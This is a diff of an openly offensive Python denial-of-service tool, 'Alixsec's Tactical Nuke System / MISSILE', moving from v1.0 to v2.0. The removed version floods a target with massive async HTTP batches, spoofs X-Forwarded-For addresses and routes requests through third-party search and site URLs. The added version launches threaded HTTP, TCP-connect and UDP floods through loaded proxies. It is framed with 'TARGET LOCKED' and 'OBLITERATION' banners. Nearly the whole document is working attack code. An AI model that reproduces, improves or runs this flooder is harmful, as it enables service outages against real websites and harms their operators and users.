@@ -1,169 +1,92 @@
-
-# Made By Alixsec
-import os
+#Made By Alixsec
+import socket
+import threading
 import random
-import time
-import asyncio
-import aiohttp
+from time import sleep
 from rich.console import Console
-from colorama import Fore, Style, init
-
-# Initialize colorama and rich console
-init(autoreset=True)
-console = Console()
-
-# Status tracking for requests sent
-status_counts = {
-    '200': 0,
-    '404': 0,
-    '500': 0,
-    'timeout': 0,
-    'failed': 0,
-    'client_error': 0,
-    'server_error': 0,
-}
-
-# Global request counter
-request_counter = 0
-
-# Display the missile-themed banner
-def display_banner():
-    banner = f"""
-    {Fore.RED}***************************************************
-    {Fore.YELLOW}      ╔════════════════════════════════════╗
-    {Fore.YELLOW}      ║    Alixsec's Tactical Nuke System  ║
-    {Fore.YELLOW}      ║          MISSILE  v1.0             ║
-    {Fore.YELLOW}      ║         FREE PALESTINE!            ║
-    {Fore.YELLOW}      ╚════════════════════════════════════╝
-
-    {Fore.GREEN}                __       __       __       __
-    {Fore.RED}              /  ╦>{Fore.YELLOW}   / ╦>{Fore.GREEN}   / ╦>{Fore.YELLOW}   / ╦>
-    {Fore.RED}             /____╩>{Fore.YELLOW} /___╩>{Fore.GREEN} /___╩>{Fore.YELLOW} /___╩>
-    
-    {Fore.RED}     ╔═══════════════════════════╗
-    {Fore.RED}     ║       TARGET LOCKED       ║
-    {Fore.RED}     ╚═══════════════════════════╝
-
-    {Fore.GREEN}     >>> OBLITERATION BEGINS NOW <<<    
-    {Fore.YELLOW}***************************************************
-    """
-    console.print(banner, style="bold")
-
-# Function to get bots from search engines and social media platforms
-def get_bots():
-    return [
-        # Search Engines
-        "http://www.google.com/search?q=",
-        "http://www.bing.com/search?q=",
-        "http://www.baidu.com/s?wd=",
-        "http://www.yahoo.com/search?p=",
-        "http://www.yandex.com/search?text=",
-        "http://duckduckgo.com/?q=",
-        "http://www.ask.com/web?q=",
-        "http://search.aol.com/aol/search?q=",
-        "http://www.ecosia.org/search?q=",
-        "http://www.lycos.com/web?q=",
-
-        # Social Media Bots
-        "http://www.facebook.com/search/top?q=",
-        "http://www.instagram.com/web/search/topsearch/?context=blended&query=",
-        "http://twitter.com/search?q=",
-        "http://www.linkedin.com/search/results/all/?keywords=",
-        "http://t.me/s/",  # Telegram search
-        "http://www.reddit.com/search/?q=",
-        "http://www.pinterest.com/search/?q=",
-        "http://vk.com/search?c[q]=",
-        "http://www.tumblr.com/search?q=",
-        "http://weibo.com/search?q=",
-        "http://mix.com/search?q=",
-
-        # News Bots
-        "http://www.nytimes.com/search?query=",
-        "http://www.theguardian.com/search?q=",
-        "http://www.bbc.co.uk/search?q=",
-        "http://www.cnn.com/search/?q=",
-        "http://www.nbcnews.com/search/?q=",
-        "http://www.foxnews.com/search-results/search?q=",
-        "http://www.reuters.com/search/news?blob=",
-        "http://www.aljazeera.com/Search/?q=",
-        "http://www.huffpost.com/search?q=",
-        "http://www.bloomberg.com/search?q=",
-        "http://www.forbes.com/search/?q=",
-
-        # E-commerce Crawlers
-        "http://www.amazon.com/s?k=",
-        "http://www.ebay.com/sch/i.html?_nkw=",
-        "http://www.alibaba.com/trade/search?SearchText=",
-        "http://www.flipkart.com/search?q=",
-        "http://www.walmart.com/search/?query=",
-        "http://www.etsy.com/search?q=",
-        "http://www.shopify.com/search?q=",
-        "http://www.bestbuy.com/site/searchpage.jsp?st=",
-        "http://www.target.com/s?searchTerm=",
-        "http://www.newegg.com/p/pl?d=",
-        "http://www.mercadolibre.com/jm/search?q=",
-
-        # Streaming/Video Bots
-        "http://www.youtube.com/results?search_query=",
-        "http://vimeo.com/search?q=",
-        "http://www.dailymotion.com/search/",
-        "http://www.twitch.tv/search?term=",
-        "http://www.netflix.com/search?q=",
-
-        # Music Search Bots
-        "http://open.spotify.com/search/",
-        "http://soundcloud.com/search?q=",
-        "http://www.apple.com/itunes/search/?q=",
-        "http://www.pandora.com/search?q=",
-
-        # Map Search Bots
-        "http://maps.google.com/maps?q=",
-        "http://www.bing.com/maps?q=",
-        "http://maps.yahoo.com/#q=",
-        "http://www.openstreetmap.org/search?query=",
-
-        # Torrent Search Bots
-        "http://www.thepiratebay.org/search/",
-        "http://www.1337x.to/search/",
-        "http://www.rarbg.to/torrents.php?search=",
-        "http://yts.mx/browse-movies/",
-        "http://torrentz2.is/search?q=",
-
-        # Crawler & Analytics Bots
-        "http://www.similarweb.com/website/",
-        "http://moz.com/researchtools/ose/links?site=",
-        "http://majestic.com/reports/site-explorer?q=",
-        "http://www.alexa.com/siteinfo/",
-        "http://uptime.com/check?host=",
-        "http://validator.w3.org/check?uri=",
-        "http://whois.domaintools.com/",
-        "http://www.geopeeker.com/fetch/?url=",
-
-        # Academic Search Bots
-        "http://scholar.google.com/scholar?q=",
-        "http://www.jstor.org/action/doBasicSearch?Query=",
-        "http://ieeexplore.ieee.org/search/searchresult.jsp?queryText=",
-        "http://pubmed.ncbi.nlm.nih.gov/?term=",
-
-        # Code Repositories
-        "http://github.com/search?q=",
-        "http://bitbucket.org/search?q=",
-        "http://gitlab.com/search?search=",
-        "http://sourceforge.net/directory/?q=",
-
-        # Other Crawlers
-        "http://www.archive.org/",
-        "http://validator.nu/?doc=",
-        "http://downforeveryoneorjustme.com/",
-        "http://www.traceroute.org/",
-        "http://www.sslshopper.com/ssl-checker.html#hostname=",
-        "http://www.webpagetest.org/?url=",
-    ]
+from rich import print
+from urllib.parse import urlparse
+from colorama import Fore
 
 
-# Function to pick random user agents for plausible deniability
-def user_agents():
-    return [
+console_output = Console()
+
+
+target_host = ""
+target_port = 0
+attack_level = 20
+request_delay = 0.01  
+successful_attacks = 0
+failed_attacks = 0
+user_agents = []
+proxies = []  
+headers = []  
+
+
+search_urls = [
+    # Search Engines
+    "http://www.google.com/search?q=", "http://www.bing.com/search?q=", "http://www.baidu.com/s?wd=",
+    "http://www.yahoo.com/search?p=", "http://www.yandex.com/search?text=", "http://duckduckgo.com/?q=",
+    "http://www.ask.com/web?q=", "http://search.aol.com/aol/search?q=", "http://www.ecosia.org/search?q=",
+    "http://www.lycos.com/web?q=",
+
+    # Social Media Bots
+    "http://www.facebook.com/search/top?q=", "http://www.instagram.com/web/search/topsearch/?context=blended&query=",
+    "http://twitter.com/search?q=", "http://www.linkedin.com/search/results/all/?keywords=",
+    "http://t.me/s/",  # Telegram search
+    "http://www.reddit.com/search/?q=", "http://www.pinterest.com/search/?q=", "http://vk.com/search?c[q]=",
+    "http://www.tumblr.com/search?q=", "http://weibo.com/search?q=", "http://mix.com/search?q=",
+
+    # News Bots
+    "http://www.nytimes.com/search?query=", "http://www.theguardian.com/search?q=", "http://www.bbc.co.uk/search?q=",
+    "http://www.cnn.com/search/?q=", "http://www.nbcnews.com/search/?q=", "http://www.foxnews.com/search-results/search?q=",
+    "http://www.reuters.com/search/news?blob=", "http://www.aljazeera.com/Search/?q=", "http://www.huffpost.com/search?q=",
+    "http://www.bloomberg.com/search?q=", "http://www.forbes.com/search/?q=",
+
+    # E-commerce Crawlers
+    "http://www.amazon.com/s?k=", "http://www.ebay.com/sch/i.html?_nkw=", "http://www.alibaba.com/trade/search?SearchText=",
+    "http://www.flipkart.com/search?q=", "http://www.walmart.com/search/?query=", "http://www.etsy.com/search?q=",
+    "http://www.shopify.com/search?q=", "http://www.bestbuy.com/site/searchpage.jsp?st=", "http://www.target.com/s?searchTerm=",
+    "http://www.newegg.com/p/pl?d=", "http://www.mercadolibre.com/jm/search?q=",
+
+    # Streaming/Video Bots
+    "http://www.youtube.com/results?search_query=", "http://vimeo.com/search?q=", "http://www.dailymotion.com/search/",
+    "http://www.twitch.tv/search?term=", "http://www.netflix.com/search?q=",
+
+    # Music Search Bots
+    "http://open.spotify.com/search/", "http://soundcloud.com/search?q=", "http://www.apple.com/itunes/search/?q=",
+    "http://www.pandora.com/search?q=",
+
+    # Map Search Bots
+    "http://maps.google.com/maps?q=", "http://www.bing.com/maps?q=", "http://maps.yahoo.com/#q=",
+    "http://www.openstreetmap.org/search?query=",
+
+    # Torrent Search Bots
+    "http://www.thepiratebay.org/search/", "http://www.1337x.to/search/", "http://www.rarbg.to/torrents.php?search=",
+    "http://yts.mx/browse-movies/", "http://torrentz2.is/search?q=",
+
+    # Crawler & Analytics Bots
+    "http://www.similarweb.com/website/", "http://moz.com/researchtools/ose/links?site=", "http://majestic.com/reports/site-explorer?q=",
+    "http://www.alexa.com/siteinfo/", "http://uptime.com/check?host=", "http://validator.w3.org/check?uri=",
+    "http://whois.domaintools.com/", "http://www.geopeeker.com/fetch/?url=",
+
+    # Academic Search Bots
+    "http://scholar.google.com/scholar?q=", "http://www.jstor.org/action/doBasicSearch?Query=",
+    "http://ieeexplore.ieee.org/search/searchresult.jsp?queryText=", "http://pubmed.ncbi.nlm.nih.gov/?term=",
+
+    # Code Repositories
+    "http://github.com/search?q=", "http://bitbucket.org/search?q=", "http://gitlab.com/search?search=",
+    "http://sourceforge.net/directory/?q=",
+
+    # Other Crawlers
+    "http://www.archive.org/", "http://validator.nu/?doc=", "http://downforeveryoneorjustme.com/", "http://www.traceroute.org/",
+    "http://www.sslshopper.com/ssl-checker.html#hostname=", "http://www.webpagetest.org/?url=",
+]
+
+
+def generate_user_agents():
+    global user_agents
+    user_agents = [        
     # Windows User Agents
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
@@ -212,124 +135,124 @@ def user_agents():
 ]
 
 
-# IP Spoofing to mask real IP address
-def spoof_ip():
-    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+def load_proxies():
+    global proxies
+    with open("proxy.txt", "r") as file:
+        proxies = [line.strip() for line in file.readlines() if line.strip()]
 
-# Randomized live update messages
-def get_live_update(hit_type):
-    updates = {
-        'hit': [
-            "[MISSILE STRIKE] Direct hit! The target is on fire! 🚀🔥",
-            "[BOOM] That one landed square on the server. 💥",
-            "[TARGET LOCKED] Missile hit successfully. 💣",
-            "[SUCCESS] The missile pierced through the firewall! 💀",
-            "[PWNED] The target never saw it coming. 🎯"
-        ],
-        'miss': [
-            "[MISS] Missile veered off course. No impact this time. 🛑",
-            "[ERROR] The missile failed to hit. Retargeting... ⚠️",
-            "[OFF TARGET] No damage inflicted. 🚫",
-            "[ESCAPE] Target dodged this one. Reloading... 🌀"
-        ],
-        'timeout': [
-            "[TIMEOUT] Missile lost in space. Target unreachable. ⏳",
-            "[TIMED OUT] No response from the target. 💤",
-            "[CONNECTION LOST] Missile failed to reach the destination. 😴"
-        ],
-        'fail': [
-            "[MALFUNCTION] Missile launch failed. 🔧",
-            "[SYSTEM ERROR] The missile broke mid-flight! 🚀💥",
-            "[GLITCH] Something went wrong, recalibrating attack... 🤖",
-        ]
-    }
-    return random.choice(updates[hit_type])
+def load_headers():
+    global headers
+    with open("header.txt", "r") as file:
+        headers = [line.strip() for line in file.readlines() if line.strip()]
 
-# Asynchronous attack with random methods and bots
-async def async_attack(target, method='GET', session=None, headers=None):
-    global request_counter
-    try:
-        async with session.request(method, url=target, headers=headers) as response:
-            request_counter += 1
-            if response.status == 200:
-                console.print(f"{Fore.GREEN}[HIT] {target} - 200 OK")
-                status_counts['200'] += 1
-                console.print(get_live_update('hit'))
-            elif response.status == 404:
-                console.print(f"{Fore.YELLOW}[MISS] {target} - 404 Not Found")
-                status_counts['404'] += 1
-                console.print(get_live_update('miss'))
-            elif response.status == 500:
-                console.print(f"{Fore.RED}[IMPACT] {target} - 500 Server Error")
-                status_counts['500'] += 1
-                console.print(get_live_update('hit'))
-            elif response.status >= 400 and response.status < 500:
-                console.print(f"{Fore.YELLOW}[CLIENT ERROR] {target} - Status: {response.status}")
-                status_counts['client_error'] += 1
-                console.print(get_live_update('miss'))
-            elif response.status >= 500 and response.status < 600:
-                console.print(f"{Fore.RED}[SERVER ERROR] {target} - Status: {response.status}")
-                status_counts['server_error'] += 1
-                console.print(get_live_update('hit'))
-            else:
-                console.print(f"{Fore.MAGENTA}[UNKNOWN] {target} - Status: {response.status}")
-    except asyncio.TimeoutError:
-        console.print(f"{Fore.RED}[TIMEOUT] {target} - Connection timed out.")
-        status_counts['timeout'] += 1
-        console.print(get_live_update('timeout'))
-    except Exception as e:
-        console.print(f"{Fore.RED}[ERROR] {target} - Failed: {e}")
-        status_counts['failed'] += 1
-        console.print(get_live_update('fail'))
+def configure_attack():
+    global target_host, target_port, attack_level, request_delay
+    target_url = input("Enter target URL (e.g., https://example.com or http://example.com): ").strip()
+    parsed_url = urlparse(target_url)
+    target_host = parsed_url.hostname
 
-# Direct missile attack with async and spoofed IPs
-async def missile_direct_attack(target, port, session):
-    method = random.choice(['GET', 'POST', 'DELETE'])
-
-    # Randomly decide if we should use a bot URL or target URL
-    if random.random() < 0.3:  # 30% chance of using a bot
-        bot_url = random.choice(get_bots()) + target
-        url = bot_url
+    if parsed_url.scheme == "https":
+        target_port = 443
     else:
-        url = f"http://{target}:{port}"
+        target_port = 80
 
-    headers = {
-        'User-Agent': random.choice(user_agents()),
-        'X-Forwarded-For': spoof_ip(),
-        'Accept': '*/*'
-    }
+    attack_level_input = input(f"Enter attack level (default {attack_level}): ").strip()
+    if attack_level_input:
+        attack_level = int(attack_level_input)
+
+    request_delay = 0.01  # Faster attack for maximum load
+
+def execute_attack():
+    configure_attack()
+    generate_user_agents()
+    load_proxies()
+    load_headers()
+    print(f"Target: {target_host}, Port: {target_port}, Attack Level: {attack_level}")
+
+def attack_worker():
+    for i in range(attack_level):
+        proxy = random.choice(proxies) if proxies else None
+
+        # HTTP thread attack
+        http_thread = threading.Thread(target=http_flood, args=(proxy,))
+        http_thread.daemon = True
+        http_thread.start()
+
+        # SYN flood thread
+        syn_thread = threading.Thread(target=syn_flood, args=(proxy,))
+        syn_thread.daemon = True
+        syn_thread.start()
+
+        # UDP flood thread
+        udp_thread = threading.Thread(target=udp_flood, args=(proxy,))
+        udp_thread.daemon = True
+        udp_thread.start()
+
+def http_flood(proxy=None):
+    global successful_attacks
+    try:
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if proxy:
+                proxy_ip, proxy_port = proxy.split(':')
+                sock.connect((proxy_ip, int(proxy_port)))
+            else:
+                sock.connect((target_host, target_port))
+            header = random.choice(headers) if headers else "User-Agent: " + random.choice(user_agents)
+            sock.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n{header}\r\n\r\n".encode())
+            sock.close()
+            successful_attacks += 1
+    except Exception as e:
+        failed_attacks += 1
+
+def syn_flood(proxy=None):
+    global successful_attacks
+    try:
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.connect((target_host, target_port))
+            sock.send(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_host.encode()))
+            sock.close()
+            successful_attacks += 1
+    except Exception as e:
+        failed_attacks += 1
+
+def udp_flood(proxy=None):
+    global successful_attacks
+    try:
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            message = random._urandom(1024)
+            sock.sendto(message, (target_host, target_port))
+            successful_attacks += 1
+    except Exception as e:
+        failed_attacks += 1
+
+# Banner for the attack system
+banner = f"""
+    {Fore.RED}***************************************************
+    {Fore.YELLOW}      ╔════════════════════════════════════╗
+    {Fore.YELLOW}      ║    Alixsec's Tactical Nuke System  ║
+    {Fore.YELLOW}      ║          MISSILE  v2.0             ║
+    {Fore.YELLOW}      ║         FREE PALESTINE!            ║
+    {Fore.YELLOW}      ╚════════════════════════════════════╝
+
+    {Fore.GREEN}                __       __       __       __
+    {Fore.RED}              /  ╦>{Fore.YELLOW}   / ╦>{Fore.GREEN}   / ╦>{Fore.YELLOW}   / ╦>
+    {Fore.RED}             /____╩>{Fore.YELLOW} /___╩>{Fore.GREEN} /___╩>{Fore.YELLOW} /___╩>
     
-    await async_attack(url, method, session=session, headers=headers)
+    {Fore.RED}     ╔═══════════════════════════╗
+    {Fore.RED}     ║       TARGET LOCKED       ║
+    {Fore.RED}     ╚═══════════════════════════╝
 
-# Async missile launch function
-async def launch_missiles_async(target, port):
-    timeout = aiohttp.ClientTimeout(total=5)  # Adjusted timeout for faster retries
-    connector = aiohttp.TCPConnector(limit=100000, ttl_dns_cache=300)  # Reuse connections
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        while True:  # Infinite loop to keep launching attacks
-            tasks = []
-            for _ in range(100000):  # Create 100000 tasks per batch
-                tasks.append(missile_direct_attack(target, port, session))
-            await asyncio.gather(*tasks)
+    {Fore.GREEN}     >>> OBLITERATION BEGINS NOW <<<    
+    {Fore.YELLOW}***************************************************
+"""
 
-# Main launcher function
-def launch_missiles(target, port):
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(launch_missiles_async(target, port))
+console_output.print(banner, style="bold")
 
-# Get inputs from user
-def get_inputs():
-    target = input("Enter target (IP or Domain): ")
-    while True:
-        try:
-            port = int(input("Enter port to attack (default 443): ") or 443)
-            break
-        except ValueError:
-            console.print(f"{Fore.RED}Invalid port. Try again.")
-    return target, port
-
-# Main execution
+# Main execution starts
 if __name__ == "__main__":
-    display_banner()
-    target, port = get_inputs()
-    launch_missiles(target, port)
+    execute_attack()
+    attack_worker()
